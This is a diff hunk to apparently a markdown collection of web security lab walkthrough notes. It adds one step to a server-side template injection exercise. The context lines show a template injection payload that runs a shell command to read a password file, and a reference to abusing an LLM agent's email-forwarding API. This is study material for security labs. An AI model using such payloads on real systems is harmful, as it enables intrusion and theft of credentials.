@@ -3511,6 +3511,7 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Read the my_password.txt from home directory
     `${dwf.newInstance(ec,null)("cat my_password.txt ")}`
 - Server-side template injection with a **custom exploit (Expert)**
+  - Upload valid avatar img + Update your preferred name
   - Upload invalid avatar img
     ```
     PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
